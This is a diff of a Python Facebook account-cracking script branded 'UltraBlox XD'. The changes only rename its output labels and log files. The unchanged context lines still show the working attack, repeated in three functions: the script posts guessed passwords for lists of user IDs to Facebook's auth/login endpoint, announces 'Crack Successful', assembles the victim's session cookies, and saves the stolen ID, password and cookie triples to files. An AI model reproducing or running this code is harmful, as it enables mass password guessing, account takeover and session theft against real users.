@@ -200,7 +200,7 @@ BB   BB  LL      OO   OO   XX XX
 BBBBBB   LLLLLL   OOOOO   XX   XX
 
 \033[0m ================================================
-    💕❤️\033[92;1mMoqadar k sekandr kbi joooka ni krty❤💕
+    💕❤️\033[92;1mPlease Do Feedback or Patay lahat❤💕
 \033[1;37m ================================================
  \033[1;97m[\033[1;92m•\033[1;97m] Owner    : UltraBlox XD
  \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : UltraBlox-14
@@ -342,18 +342,18 @@ def ffb(ids,names,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r\033[1;92m [UltraBlox-OK] '+ids+' | '+pas+f'\033[1;97m')
+                                        print(f'\r\r\033[1;92m [UltraBlox-GG] '+ids+' | '+pas+f'\033[1;97m')
                                         os.system('espeak -a 300 " Crack,   Successful,"')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                         cookies = f"sb={ssbb};{coki}"
-                                        open('/sdcard/UltraBlox/UltraBlox-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        open('/sdcard/UltraBlox/UltraBlox-COOKIES.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
+                                        open('/sdcard/UltraBlox/UltraBlox-GG.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/UltraBlox/UltraBlox-PUKE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                         oks.append(ids);type(ids,pas,cookies)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
-                                        print(f'\r\r\033[1;91m [UltraBlox-CP] '+ids+' | '+pas+f'\033[1;97m')
-                                        open(f'/sdcard/UltraBlox/UltraBlox-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;91m [UltraBlox-WALA] '+ids+' | '+pas+f'\033[1;97m')
+                                        open(f'/sdcard/UltraBlox/UltraBlox-WALA.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                         else:
@@ -367,7 +367,7 @@ def ffb(ids,names,passlist):
 def api(ids,names,passlist):
         try:
                 global loop,oks,cps
-                sys.stdout.write('\r [UltraBlox] %s | M2 OK/CP %s/%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+                sys.stdout.write('\r [UltraBlox] %s | M2 GG/CP %s/%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                 first = names.split(' ')[0]
                 try:
                         last = names.split(' ')[1]
@@ -418,18 +418,18 @@ def api(ids,names,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r\033[1;92m [UltraBlox-OK] '+ids+' | '+pas+f'\033[1;97m')
+                                        print(f'\r\r\033[1;92m [UltraBlox-GG] '+ids+' | '+pas+f'\033[1;97m')
                                         os.system('espeak -a 300 " Crack,   Successful,"')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                         cookies = f"sb={ssbb};{coki}"
-                                        open('/sdcard/UltraBlox/UltraBlox-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        open('/sdcard/UltraBlox/UltraBlox-COOKIES.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
+                                        open('/sdcard/UltraBlox/UltraBlox-GG.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/UltraBlox/UltraBlox-PUKE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                         oks.append(ids);type(ids,pas,cookies)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
-                                        print(f'\r\r\033[1;91m [UltraBlox-CP] '+ids+' | '+pas+f'\033[1;97m')
-                                        open(f'/sdcard/UltraBlox/UltraBlox-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;91m [UltraBlox-WALA] '+ids+' | '+pas+f'\033[1;97m')
+                                        open(f'/sdcard/UltraBlox/UltraBlox-WALA.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                         else:
@@ -495,18 +495,18 @@ def api1(ids,names,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r\033[1;92m [UltraBlox-OK] '+ids+' | '+pas+f'\033[1;97m')
+                                        print(f'\r\r\033[1;92m [UltraBlox-GG] '+ids+' | '+pas+f'\033[1;97m')
                                         os.system('espeak -a 300 " Crack,   Successful,"')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                         cookies = f"sb={ssbb};{coki}"
-                                        open('/sdcard/UltraBlox/UltraBlox-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        open('/sdcard/UltraBlox/UltraBlox-COOKIES.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
+                                        open('/sdcard/UltraBlox/UltraBlox-GG.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/UltraBlox/UltraBlox-PUKE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                         oks.append(ids);type(ids,pas,cookies)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
-                                        print(f'\r\r\033[1;91m [UltraBlox-CP] '+ids+' | '+pas+f'\033[1;97m')
-                                        open(f'/sdcard/UltraBlox/UltraBlox-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;91m [UltraBlox-WALA] '+ids+' | '+pas+f'\033[1;97m')
+                                        open(f'/sdcard/UltraBlox/UltraBlox-WALA.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                         else:
